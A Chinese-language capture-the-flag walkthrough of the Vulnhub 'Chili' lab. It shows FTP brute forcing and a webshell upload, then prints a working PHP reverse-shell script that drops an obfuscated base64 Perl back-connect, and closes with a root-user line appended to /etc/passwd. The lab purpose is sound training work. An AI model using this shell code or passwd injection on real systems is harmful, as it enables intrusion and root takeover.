---
title: chili
---

# 描述

> - Difficulty: Easy
> - Tested: VMware Workstation 15.x Pro (This works better with VMware rather than VirtualBox)
> - Goal: Get the root shell i.e.(root@localhost:~#) and then obtain flag under /root).
> - Information: Your feedback is appreciated - Email: suncsr.challenges@gmail.com
> - Hint : "If you ever get stuck, try again with the name of the lab"

# 信息收集

## arp-scan

使用arp-scan扫描内网，确定靶机IP

![image-20240709181821299](https://cdn.a1pha.cn/img/202407112352634.png)

## nmap

全端口扫描，并且确定所开放端口的服务以及对应的版本

```bash
nmap -sV -sC -p- 192.168.170.137
```

开放了21端口ftp服务，对应vsftpd 3.0.3

以及80端口的http服务，对应Apache2.4.38

![image-20240710132641807](https://cdn.a1pha.cn/img/202407112352636.png)

## dirseach

使用dirsearch扫目录，也没有扫出有用的东西

![image-20240710133422756](https://cdn.a1pha.cn/img/202407112352637.png)

## 查看源代码

在源代码中看到一个敏感词`keywords`内容为：Chili，结合靶机名字，猜测为ftp的用户名

![image-20240710133516341](https://cdn.a1pha.cn/img/202407112352638.png)

# 漏洞利用

## hydra爆破ftp弱口令

![image-20240711194440833](https://cdn.a1pha.cn/img/202407112352639.png)

## 超级弱口令爆破

![image-20240711194505949](https://cdn.a1pha.cn/img/202407112352640.png)

## 登录ftp

![image-20240711194623602](https://cdn.a1pha.cn/img/202407112352641.png)

进入到网站的根目录下可以看到`.nano`和`.vim`两个隐藏文件夹，其中`.nano`文件夹具有**任何用户都可以读取、修改或执行该目录中的文件或目录**的权限，而`.vim`目录只有**所有者可以读取、修改或执行该目录中的文件或目录，而组用户和其他用户只能读取和执行，但不能修改**的权限

![image-20240711200022620](https://cdn.a1pha.cn/img/202407112352642.png)

那么我们可以利用`.nano`目录的权限，上传一句话木马

## 一句话木马

上传一句话木马后使用蚁剑连接

![image-20240711202024498](https://cdn.a1pha.cn/img/202407112352643.png)

当我们直接点击打开root目录时，是会提醒权限不够的，所以要进行提权的操作

![image-20240711232306854](https://cdn.a1pha.cn/img/202407112352644.png)

## 反弹shell

因为蚁剑自带的虚拟终端很难用，所以还是要进行反弹shell的操作，以方便后续的提权操作

```php
<?php
function which($pr) {
	$path = execute("which $pr");
	return ($path ? $path : $pr);
	}
function execute($cfe) {
	$res = '';
	if ($cfe) {
		if(function_exists('exec')) {
			@exec($cfe,$res);
			$res = join("\n",$res);
			} 
			elseif(function_exists('shell_exec')) {
			$res = @shell_exec($cfe);
			} elseif(function_exists('system')) {
@ob_start();
@system($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(function_exists('passthru')) {
@ob_start();
@passthru($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(@is_resource($f = @popen($cfe,"r"))) {
$res = '';
while(!@feof($f)) {
$res .= @fread($f,1024);
}
@pclose($f);
}
}
return $res;
}
function cf($fname,$text){
if($fp=@fopen($fname,'w')) {
@fputs($fp,@base64_decode($text));
@fclose($fp);
}
}
$yourip = "your IP";
$yourport = 'your port';
$usedb = array('perl'=>'perl','c'=>'c');
$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
cf('/tmp/.bc',$back_connect);
$res = execute(which('perl')." /tmp/.bc $yourip $yourport &");
?> 
```

反弹成功

![image-20240711232550579](https://cdn.a1pha.cn/img/202407112352646.png)

## 提权

切换交互式shell

``` python
python3 -c "import pty;pty.spawn('/bin/bash')"
```

![image-20240711232651731](https://cdn.a1pha.cn/img/202407112352647.png)

### enumy64

使用enumy64进行提权枚举

可以看到`/etc/passwd`文允许其他用户读取和修改

![image-20240711234018842](https://cdn.a1pha.cn/img/202407112352648.png)

那么，我们就可以利用这个漏洞，添加一个新的用户，并加入到管理员组里，即可实现提权

### 添加新用户

openssl生成密码

```bash
openssl passwd -1 -salt hack hack 
```

![image-20240711234128116](https://cdn.a1pha.cn/img/202407112352649.png)

写入`/etc/passwd`

```bash
echo 'hack:$1$hack$xR6zsfvpez/t8teGRRSNr.:0:0:root:/root:/bin/bash' >>/etc/passwd
```

![image-20240711234332197](https://cdn.a1pha.cn/img/202407112352650.png)

### 提权成功

切换用户即可看到当前用户已经成功加入到root组

![image-20240711234351350](https://cdn.a1pha.cn/img/202407112352651.png)

# flag

读取root目录下的proof.txt文件即可获取到flag

![image-20240711234542926](https://cdn.a1pha.cn/img/202407112352652.png)

# 参考&工具

- [Vulnhub Chili靶机详细解题过程](https://www.cnblogs.com/jason-huawen/p/16894316.html)
- [php反弹shell脚本](https://blog.csdn.net/a1_pha/article/details/135800772)
- [enumy](https://github.com/luke-goddard/enumy)
